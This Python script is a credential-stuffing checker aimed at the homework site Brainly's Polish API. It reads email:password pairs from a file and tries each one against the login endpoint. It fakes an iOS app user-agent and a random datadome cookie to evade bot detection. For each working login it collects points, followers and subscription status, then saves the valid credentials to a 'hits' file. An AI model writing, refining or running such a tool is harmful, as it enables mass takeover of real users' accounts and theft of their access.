import requests
import time
import random

# random datadome cookie cuz why not
datadome = random.randint(1000045827500, 9999999999999999999)

# config
auth_url = "https://brainly.pl/api/28/api_account/authorize"
headers = {
    "Accept": "application/json",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-GB,en;q=0.9",
    "Connection": "keep-alive",
    "Content-Type": "application/json; charset=utf-8",
    "Cookie": f"datadome={datadome}", # you can hard code one, it doesnt matter. It can be something like '1' 
    "Host": "brainly.pl",
    "User-Agent": "iOS-App/4.194.0 Brainly/5948 CFNetwork/3860.200.71 Darwin/25.1.0"
}

def read_creds(file):
    creds = []
    with open(file, 'r', encoding='utf-8') as f:
        for idx, line in enumerate(f, 1):
            line = line.strip()
            if not line or ':' not in line:
                continue
            mail, passwd = line.split(':', 1)
            creds.append({"mail": mail.strip(), "pass": passwd.strip(), "line": idx})
    return creds

def get_profile(token_headers):
    url = "https://brainly.pl/api/28/api_users/me"
    h = headers.copy()
    if "X-B-Token-Long" in token_headers:
        h["X-B-Token-Long"] = token_headers["X-B-Token-Long"]
    elif "X-B-Token-Short" in token_headers:
        h["X-B-Token-Short"] = token_headers["X-B-Token-Short"]
    
    try:
        r = requests.get(url, headers=h, timeout=10)
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return None

def get_detailed_profile(uid, token):
    url = f"https://brainly.pl/api/28/api_user_profiles/get_by_id/{uid}"
    h = headers.copy()
    h["X-B-Token-Long"] = token
    try:
        r = requests.get(url, headers=h, timeout=10)
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return None

# main
creds = read_creds("credentials.txt")
print(f"[+] Loaded {len(creds)} accounts")

good = []

for i, acc in enumerate(creds, 1):
    payload = {
        "client_type": 2,
        "username": acc["mail"],
        "password": acc["pass"],
        "autologin": True
    }

    try:
        resp = requests.post(auth_url, json=payload, headers=headers, timeout=10)
        
        try:
            js = resp.json()
            if js.get("success") == True:
                print(f"[+] {i}/{len(creds)} GOOD → {acc['mail']}")

                # grab profile
                profile = get_profile(resp.headers)
                uid = points = followers = following = sub = "N/A"
                token = resp.headers.get("X-B-Token-Long")

                if profile and profile.get("data"):
                    user = profile["data"].get("user", {})
                    uid = user.get("id")
                    points = user.get("points", 0)

                    if profile["data"].get("brainlyPlus", {}).get("subscription"):
                        sub = "Brainly Plus"
                    else:
                        sub = "Free"

                    # detailed stats
                    if uid and token:
                        det = get_detailed_profile(uid, token)
                        if det and det.get("success"):
                            data = det.get("data", {})
                            followers = data.get("follower_count", 0)
                            following = data.get("followed_count", 0)

                print(f"    ID: {uid} | Points: {points} | Followers: {followers} | Following: {following} | Sub: {sub}")
                
                good.append(f"{acc['mail']}:{acc['pass']} | {points} | {followers} | {following} | {sub}")

            else:
                print(f"[-] {i}/{len(creds)} BAD → {acc['mail']}")
        except:
            print(f"[-] {i}/{len(creds)} JSON ERROR → {acc['mail']}")

    except Exception as e:
        print(f"[-] {i}/{len(creds)} REQUEST ERROR → {e}")

    time.sleep(0.1)  # rate limit

# save hits
if good:
    with open("hits.txt", "w", encoding="utf-8") as f:
        for line in good:
            f.write(line + "\n")
    print(f"\n[+] Saved {len(good)} hits to hits.txt")
    
    print("\n=== GOOD ACCOUNTS ===")
    for x in good:
        print(x)
else:
    print("\n[-] No hits")